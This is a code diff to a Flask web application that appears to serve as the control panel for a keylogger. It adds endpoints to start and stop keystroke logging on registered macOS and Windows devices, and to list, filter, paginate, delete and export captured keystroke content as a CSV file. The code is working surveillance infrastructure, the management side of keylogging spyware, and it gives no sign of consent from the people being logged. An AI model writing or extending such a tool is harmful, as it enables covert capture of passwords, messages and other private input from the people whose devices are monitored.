@@ -523,40 +523,43 @@ def toggle_logging():
         if not device:
             return jsonify({'error': 'Device not found'}), 404
             
-        if device.os_info == 'windows':
-            # For Windows devices, we just update the status
-            device.is_logging = (action == 'start')
-            db.session.commit()
-            return jsonify({
-                'status': 'success',
-                'message': f"Logging {'started' if action == 'start' else 'stopped'} successfully"
-            })
-        else:
-            # Existing macOS logic here
-            if action == 'start':
-                if keylogger_instance is None:
-                    keylogger_instance = KeyLogger(DB_PATH)
-                result = keylogger_instance.start_logging(device_id)
+        if action == 'start':
+            if device.is_logging:
+                return jsonify({'error': 'Device is already logging'}), 400
+                
+            # Initialize keylogger if needed
+            global keylogger_instance
+            if keylogger_instance is None:
+                keylogger_instance = KeyLogger(DB_PATH)
+            
+            result = keylogger_instance.start_logging(device_id)
+            if "successfully" in result:
+                device.is_logging = True
+                db.session.commit()
+                return jsonify({'status': 'success', 'message': result})
+            else:
+                return jsonify({'error': result}), 500
+                
+        elif action == 'stop':
+            if not device.is_logging:
+                return jsonify({'error': 'Device is not logging'}), 400
+                
+            if keylogger_instance:
+                result = keylogger_instance.stop_logging()
                 if "successfully" in result:
-                    device.is_logging = True
+                    device.is_logging = False
                     db.session.commit()
                     return jsonify({'status': 'success', 'message': result})
                 else:
                     return jsonify({'error': result}), 500
-            elif action == 'stop':
-                if keylogger_instance:
-                    result = keylogger_instance.stop_logging()
-                    device.is_logging = False
-                    db.session.commit()
-                    if "successfully" in result:
-                        return jsonify({'status': 'success', 'message': result})
-                    else:
-                        return jsonify({'error': result}), 500
-                else:
-                    return jsonify({'error': 'Keylogger not initialized'}), 400
-                    
+            else:
+                return jsonify({'error': 'Keylogger not initialized'}), 500
+                
+        else:
+            return jsonify({'error': 'Invalid action'}), 400
+            
     except Exception as e:
-        app.logger.error(f"Error toggling logging: {str(e)}")
+        app.logger.error(f"Error in toggle_logging: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/device/status', methods=['POST'])
@@ -845,6 +848,223 @@ def log_keystrokes():
     except Exception as e:
         db.session.rollback()
         app.logger.error(f"Error logging keystrokes: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+    
+    
+@app.route('/api/logs')
+@login_required
+def get_filtered_logs():
+    device_id = request.args.get('device_id', '')
+    date_from = request.args.get('from', '')
+    date_to = request.args.get('to', '')
+    page = int(request.args.get('page', 1))
+    per_page = int(request.args.get('per_page', 20))
+    
+    try:
+        # Start with base query
+        conn = sqlite3.connect(DB_PATH)
+        conn.row_factory = sqlite3.Row
+        c = conn.cursor()
+        
+        # Build query parts
+        query = """
+            SELECT k.id, k.device_id, k.timestamp, k.content, d.os_info as device_type
+            FROM keystrokes k
+            JOIN device d ON k.device_id = d.device_id
+            WHERE 1=1
+        """
+        params = []
+        
+        # Add filters
+        if device_id:
+            query += " AND k.device_id = ?"
+            params.append(device_id)
+        
+        if date_from:
+            query += " AND k.timestamp >= ?"
+            params.append(date_from)
+            
+        if date_to:
+            query += " AND k.timestamp <= ?"
+            params.append(date_to)
+            
+        # Add user filter - only show logs for devices belonging to current user
+        query += " AND d.user_id = ?"
+        params.append(current_user.id)
+        
+        # Count total for pagination
+        count_query = query.replace("k.id, k.device_id, k.timestamp, k.content, d.os_info as device_type", "COUNT(*)")
+        c.execute(count_query, params)
+        total_count = c.fetchone()[0]
+        
+        # Add ordering and pagination
+        query += " ORDER BY k.timestamp DESC LIMIT ? OFFSET ?"
+        params.extend([per_page, (page - 1) * per_page])
+        
+        # Execute query
+        c.execute(query, params)
+        logs = [dict(row) for row in c.fetchall()]
+        
+        conn.close()
+        
+        return jsonify({
+            'logs': logs,
+            'total': total_count,
+            'page': page,
+            'per_page': per_page,
+            'total_pages': (total_count + per_page - 1) // per_page
+        })
+        
+    except Exception as e:
+        app.logger.error(f"Error getting logs: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/logs/stats')
+@login_required
+def get_logs_stats():
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        
+        # Get total logs count
+        c.execute("""
+            SELECT COUNT(*) FROM keystrokes k
+            JOIN device d ON k.device_id = d.device_id
+            WHERE d.user_id = ?
+        """, (current_user.id,))
+        total_logs = c.fetchone()[0]
+        
+        # Get active devices count
+        c.execute("""
+            SELECT COUNT(*) FROM device
+            WHERE user_id = ? AND is_active = 1
+        """, (current_user.id,))
+        active_devices = c.fetchone()[0]
+        
+        # Get macOS devices count
+        c.execute("""
+            SELECT COUNT(*) FROM device
+            WHERE user_id = ? AND os_info = 'macos'
+        """, (current_user.id,))
+        macos_devices = c.fetchone()[0]
+        
+        # Get Windows devices count
+        c.execute("""
+            SELECT COUNT(*) FROM device
+            WHERE user_id = ? AND os_info = 'windows'
+        """, (current_user.id,))
+        windows_devices = c.fetchone()[0]
+        
+        conn.close()
+        
+        return jsonify({
+            'total_logs': total_logs,
+            'active_devices': active_devices,
+            'macos_devices': macos_devices,
+            'windows_devices': windows_devices
+        })
+        
+    except Exception as e:
+        app.logger.error(f"Error getting stats: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
+@login_required
+def delete_log(log_id):
+    try:
+        # First check if the log belongs to a device owned by the current user
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        
+        c.execute("""
+            SELECT k.id FROM keystrokes k
+            JOIN device d ON k.device_id = d.device_id
+            WHERE k.id = ? AND d.user_id = ?
+        """, (log_id, current_user.id))
+        
+        result = c.fetchone()
+        if not result:
+            conn.close()
+            return jsonify({'error': 'Log not found or access denied'}), 404
+        
+        # Delete the log
+        c.execute("DELETE FROM keystrokes WHERE id = ?", (log_id,))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        app.logger.error(f"Error deleting log: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/logs/export')
+@login_required
+def export_logs():
+    device_id = request.args.get('device_id', '')
+    date_from = request.args.get('from', '')
+    date_to = request.args.get('to', '')
+    
+    try:
+        # Start with base query
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        
+        # Build query parts
+        query = """
+            SELECT k.timestamp, k.device_id, d.os_info, k.content
+            FROM keystrokes k
+            JOIN device d ON k.device_id = d.device_id
+            WHERE d.user_id = ?
+        """
+        params = [current_user.id]
+        
+        # Add filters
+        if device_id:
+            query += " AND k.device_id = ?"
+            params.append(device_id)
+        
+        if date_from:
+            query += " AND k.timestamp >= ?"
+            params.append(date_from)
+            
+        if date_to:
+            query += " AND k.timestamp <= ?"
+            params.append(date_to)
+            
+        # Add ordering
+        query += " ORDER BY k.timestamp DESC"
+        
+        # Execute query
+        c.execute(query, params)
+        logs = c.fetchall()
+        
+        conn.close()
+        
+        # Create CSV in memory
+        import io
+        import csv
+        from flask import make_response
+        
+        output = io.StringIO()
+        writer = csv.writer(output)
+        
+        # Write header
+        writer.writerow(['Timestamp', 'Device ID', 'Device Type', 'Content'])
+        
+        # Write data
+        for log in logs:
+            writer.writerow(log)
+        
+        # Create response
+        response = make_response(output.getvalue())
+        response.headers["Content-Disposition"] = "attachment; filename=keylogger_logs.csv"
+        response.headers["Content-type"] = "text/csv"
+        
+        return response
+        
+    except Exception as e:
+        app.logger.error(f"Error exporting logs: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
